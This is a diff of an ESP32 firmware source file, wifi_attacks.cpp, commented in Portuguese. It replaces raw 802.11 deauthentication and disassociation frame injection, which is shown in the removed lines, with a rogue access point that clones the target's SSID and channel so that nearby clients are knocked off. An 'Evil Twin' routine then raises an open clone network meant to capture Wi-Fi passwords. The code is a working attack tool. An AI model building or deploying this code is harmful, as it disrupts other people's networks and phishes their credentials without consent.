@@ -1,12 +1,18 @@
 // ============================================================
-// wifi_attacks.cpp - v5.2 (ESP-IDF v4.4 compatível)
+// wifi_attacks.cpp - v6.0 (ROGUE AP APPROACH)
 //
-// FIXES:
-// 1. Sem MAC spoof (desnecessário com bypass funcional)
-// 2. Filtro de BSSID reforçado no promiscuous
-// 3. raw_tx com retry e log de erro
-// 4. Modo AP no canal do alvo (interface ativa)
-// 5. Evil Twin: deauth primeiro -> clone depois
+// NAO usa esp_wifi_80211_tx nem bypass.
+// Funciona em QUALQUER versao do ESP-IDF/Arduino-ESP32.
+//
+// PRINCIPIO:
+// 1. Sobe AP com mesmo SSID e canal do alvo
+// 2. max_connection=0 -> driver ESP32 automaticamente manda deauth
+//    para qualquer cliente que tente se associar
+// 3. Promiscuous monitora clientes do alvo
+// 4. Evil Twin: deauth via rogue AP -> depois clone visivel
+//
+// Baseado no paper: "Wi-Fi attacks using ESP32" (FIT VUTBR)
+// e na ferramenta esp32-wifi-penetration-tool (risinek)
 // ============================================================
 #include <WiFi.h>
 #include <esp_wifi.h>
@@ -23,24 +29,8 @@ static char     deauthTargetSSID[33] = {0};
 static uint8_t  deauthTargetAuth = 0;
 static unsigned long deauthStartTime = 0;
 
-static uint8_t deauthFrame[26] = {
-    0xc0, 0x00, 0x3a, 0x01,
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0xf0, 0xff, 0x02, 0x00
-};
-
-static uint8_t disassocFrame[26] = {
-    0xa0, 0x00, 0x3a, 0x01,
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0xf0, 0xff, 0x02, 0x00
-};
-
 // ============================================================
-// CLIENT DISCOVERY - FILTRO REFORÇADO
+// CLIENT DISCOVERY
 // ============================================================
 #define MAX_CLIENTS 16
 static uint8_t discoveredClients[MAX_CLIENTS][6];
@@ -59,26 +49,24 @@ static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *out
     const uint8_t *addr3 = &payload[16];
 
     if (frameType == 0x00) {
-        // Management: addr3 = BSSID
         memcpy(outBssid, addr3, 6);
-        // addr2 = SA (quem enviou), addr1 = DA
         if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
         else if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
     }
     else if (frameType == 0x08) {
         switch (toFromDs) {
-            case 0x00: // IBSS
+            case 0x00:
                 memcpy(outBssid, addr3, 6);
                 if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                 else if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                 break;
-            case 0x01: // To DS (STA -> AP)
-                memcpy(outBssid, addr1, 6); // addr1 = BSSID
-                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2; // addr2 = STA
+            case 0x01:
+                memcpy(outBssid, addr1, 6);
+                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                 break;
-            case 0x02: // From DS (AP -> STA)
-                memcpy(outBssid, addr2, 6); // addr2 = BSSID
-                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1; // addr1 = STA
+            case 0x02:
+                memcpy(outBssid, addr2, 6);
+                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                 break;
         }
     }
@@ -86,30 +74,21 @@ static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *out
 
 static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (type == WIFI_PKT_MISC) return;
-
     const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
     const uint8_t *payload = pkt->payload;
     uint16_t len = pkt->rx_ctrl.sig_len;
 
-    // Só processa Management e Data frames
-    uint8_t frameType = payload[0] & 0x0C;
-    if (frameType != 0x00 && frameType != 0x08) return;
-
-    // Só processa frames com FCS OK
     if (pkt->rx_ctrl.rx_state != 0) return;
 
     uint8_t frameBssid[6];
     const uint8_t *clientMac = nullptr;
     getBssidFromFrame(payload, len, frameBssid, &clientMac);
 
-    // Filtra pelo BSSID do alvo
     if (memcmp(frameBssid, deauthTargetBSSID, 6) != 0) return;
-    // Ignora broadcast BSSID
     if (frameBssid[0] == 0xFF) return;
     if (!clientMac) return;
-    if (clientMac[0] & 0x01) return; // multicast
+    if (clientMac[0] & 0x01) return;
 
-    // Verifica se já descobrimos
     for (int i = 0; i < clientCount; i++) {
         if (memcmp(discoveredClients[i], clientMac, 6) == 0) return;
     }
@@ -142,74 +121,6 @@ static void stopPromiscuous() {
     esp_wifi_set_promiscuous_rx_cb(NULL);
     promiscuousActive = false;
     Serial.println("[Promisc] Stopped");
-}
-
-// ============================================================
-// RAW FRAME
-// ============================================================
-static bool raw_tx(const uint8_t* frame, size_t len) {
-    for (int retry = 0; retry < 3; retry++) {
-        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
-        if (err == ESP_OK) {
-            deauthPacketCount++;
-            deauthSuccessCount++;
-            return true;
-        }
-        if (err == ESP_ERR_INVALID_STATE) {
-            delay(10);
-        } else {
-            static unsigned long lastErrLog = 0;
-            if (millis() - lastErrLog > 3000) {
-                lastErrLog = millis();
-                Serial.printf("[raw_tx] ERR %d (0x%x)\n", err, err);
-            }
-            break;
-        }
-    }
-    return false;
-}
-
-static void buildDeauthBroadcast() {
-    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-    memcpy(&deauthFrame[4], broadcast, 6);
-    memcpy(&deauthFrame[10], deauthTargetBSSID, 6);
-    memcpy(&deauthFrame[16], deauthTargetBSSID, 6);
-    memcpy(&disassocFrame[4], broadcast, 6);
-    memcpy(&disassocFrame[10], deauthTargetBSSID, 6);
-    memcpy(&disassocFrame[16], deauthTargetBSSID, 6);
-}
-
-static void setFrameAddrs(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
-    memcpy(&frame[4], da, 6);
-    memcpy(&frame[10], sa, 6);
-    memcpy(&frame[16], bssid, 6);
-}
-
-static uint8_t txBuf[26];
-
-static void deauthBurst() {
-    memcpy(txBuf, deauthFrame, 26);
-    raw_tx(txBuf, 26);
-    memcpy(txBuf, disassocFrame, 26);
-    raw_tx(txBuf, 26);
-
-    for (int i = 0; i < clientCount; i++) {
-        memcpy(txBuf, deauthFrame, 26);
-        setFrameAddrs(txBuf, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID);
-        raw_tx(txBuf, 26);
-
-        memcpy(txBuf, disassocFrame, 26);
-        setFrameAddrs(txBuf, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID);
-        raw_tx(txBuf, 26);
-
-        memcpy(txBuf, deauthFrame, 26);
-        setFrameAddrs(txBuf, deauthTargetBSSID, discoveredClients[i], deauthTargetBSSID);
-        raw_tx(txBuf, 26);
-
-        memcpy(txBuf, disassocFrame, 26);
-        setFrameAddrs(txBuf, deauthTargetBSSID, discoveredClients[i], deauthTargetBSSID);
-        raw_tx(txBuf, 26);
-    }
 }
 
 // ============================================================
@@ -247,7 +158,7 @@ NetworkInfo* getNetwork(uint8_t index) {
 }
 
 // ============================================================
-// DEAUTH
+// DEAUTH - ROGUE AP (sem raw_tx, sem bypass)
 // ============================================================
 void startDeauth(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -272,34 +183,38 @@ void startDeauth(uint8_t networkIndex) {
         target->bssid[0], target->bssid[1], target->bssid[2],
         target->bssid[3], target->bssid[4], target->bssid[5]);
 
-    buildDeauthBroadcast();
-
+    // Desliga WiFi
     WiFi.disconnect(true);
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_OFF);
     delay(500);
 
+    // Sobe AP com MESMO SSID e canal do alvo, max_connection=0
+    // O driver ESP32 automaticamente manda deauth para clientes
+    // nao-autenticados que tentam se associar
     WiFi.mode(WIFI_AP);
     delay(300);
 
-    bool apOk = WiFi.softAP("_", "", target->channel, 1, 0);
+    bool apOk = WiFi.softAP(target->ssid, "", target->channel, 0, 0);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
     esp_wifi_set_ps(WIFI_PS_NONE);
     esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
 
-    Serial.printf("[Deauth] AP on CH%d (softAP: %s)\n", target->channel, apOk ? "OK" : "FAIL");
+    Serial.printf("[Deauth] Rogue AP: %s CH%d (softAP: %s)\n",
+        target->ssid, target->channel, apOk ? "OK" : "FAIL");
+    Serial.println("[Deauth] Driver auto-deauth active (max_conn=0)");
 
     startPromiscuous();
 
     deauthActive = true;
-    Serial.println("[Deauth] STARTED");
+    Serial.println("[Deauth] STARTED - Rogue AP mode");
 }
 
 void stopDeauth() {
     if (deauthActive) {
         Serial.println("[Deauth] STOPPED");
-        Serial.printf("[Deauth] Runtime: %lu sec, pkts: %lu\n",
-            (millis() - deauthStartTime) / 1000, deauthPacketCount);
+        Serial.printf("[Deauth] Runtime: %lu sec, clients discovered: %d\n",
+            (millis() - deauthStartTime) / 1000, clientCount);
     }
     deauthActive = false;
     stopPromiscuous();
@@ -316,23 +231,22 @@ void stopDeauth() {
 }
 
 // ============================================================
-// LOOP DE DEAUTH
+// LOOP DE DEAUTH - so monitora e conta
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    for (int burst = 0; burst < 8; burst++) {
-        deauthBurst();
-    }
-
+    // O driver faz o deauth automaticamente.
+    // Aqui so monitoramos e contamos clientes descobertos.
     static unsigned long lastDebug = 0;
     if (millis() - lastDebug > 5000) {
         lastDebug = millis();
-        Serial.printf("[Deauth] runtime=%lus pkts=%lu clients=%d CH%d\n",
+        int staNum = WiFi.softAPgetStationNum();
+        Serial.printf("[Deauth] runtime=%lus clients=%d CH%d stations_on_ap=%d\n",
             (millis() - deauthStartTime) / 1000,
-            deauthPacketCount,
             clientCount,
-            deauthTargetChannel);
+            deauthTargetChannel,
+            staNum);
     }
     return true;
 }
@@ -374,7 +288,8 @@ void startEvilTwin(uint8_t networkIndex) {
 
     NetworkInfo* target = &scannedNetworks[networkIndex];
 
-    Serial.println("[EvilTwin] Phase 1: Deauth...");
+    // FASE 1: Rogue AP deauth (mesmo SSID, max_conn=0)
+    Serial.println("[EvilTwin] Phase 1: Rogue AP deauth...");
     startDeauth(networkIndex);
 
     unsigned long start = millis();
@@ -383,12 +298,14 @@ void startEvilTwin(uint8_t networkIndex) {
         delay(1);
     }
 
+    // FASE 2: Para rogue, sobe clone visivel
     Serial.println("[EvilTwin] Phase 2: Clone AP...");
     stopPromiscuous();
 
     WiFi.softAPdisconnect(true);
     delay(300);
 
+    // Clone com mesmo SSID, aceita conexoes
     WiFi.softAP(target->ssid, "", target->channel, 0, 8);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
     WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
@@ -396,7 +313,7 @@ void startEvilTwin(uint8_t networkIndex) {
     fakeAPEnabled = true;
     passwordCaptured = false;
 
-    Serial.printf("[EvilTwin] Clone: %s CH%d\n", target->ssid, target->channel);
+    Serial.printf("[EvilTwin] Clone AP: %s CH%d\n", target->ssid, target->channel);
 }
 
 // ============================================================
